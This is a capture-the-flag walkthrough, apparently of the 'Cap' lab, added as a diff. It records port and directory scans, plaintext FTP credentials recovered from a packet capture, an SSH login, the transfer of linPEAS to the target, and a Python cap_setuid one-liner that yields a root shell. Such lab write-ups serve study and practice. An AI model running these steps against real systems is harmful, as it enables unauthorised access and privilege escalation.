@@ -1,0 +1,65 @@
+Cap Lab
+
+Enumeration:
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa80a9b2ca3b8869a4289e390d27d575 (RSA)
+|   256 96d8f8e3e8f77136c549d59db6a4c90c (ECDSA)
+|_  256 3fd0ff91eb3bf6e19f2e8ddeb3deb218 (ED25519)
+80/tcp open  http    gunicorn
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+
+
+Looking for hidden web server:
+gobuster dir -u http://10.129.98.119/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+2024/06/25 03:30:24 Starting gobuster in directory enumeration mode
+===============================================================
+/data                 (Status: 302) [Size: 208] [--> http://10.129.98.119/]
+/ip                   (Status: 200) [Size: 17447]                          
+/netstat              (Status: 200) [Size: 32662]                          
+/capture              (Status: 302) [Size: 220] [--> http://10.129.98.119/data/1]
+
+Look in /data/1, there is also a http://10.129.98.119:80/data/0 which contains information of another user
+
+Let’s use wireshark
+wireshark 
+
+Open the pcap file, and we can see all the packets now.
+We find information in the ftp protocol, they are not encrypted and the data is in clear plaintext
+User: nathan
+Password: Buck3tH4TF0RM3!
+
+Now let’s try to access that FTP server using the credentials above:
+We logged and we found user.txt
+
+Let’s try if we can use it on their ssh service now
+It works as well, we are in as nathan
+
+However, sudo -l cannot be used, meaning nathan has no permissions to run sudo on cap server
+
+Let’s try to escalate our privileges with this:
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS 
+
+Download the linPEAS:
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20240623-7d729c04/linpeas.sh 
+
+Transfer the file over via SCP:
+scp linpeas.sh nathan@10.129.98.64:/tmp
+cd /
+cd tmp
+chmod +x linpeas.sh
+
+After running we find the path:
+\/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+
+Setuid means the program runs as root no matter who executes, so we can use this to our advantage
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+	-run the following command as string, we import os library which python has by default, we set ourself to root which has ID of 0 while also giving us shell in root privileges.
+
+We have now gained root permissions
+Root flag is in /root/root.txt
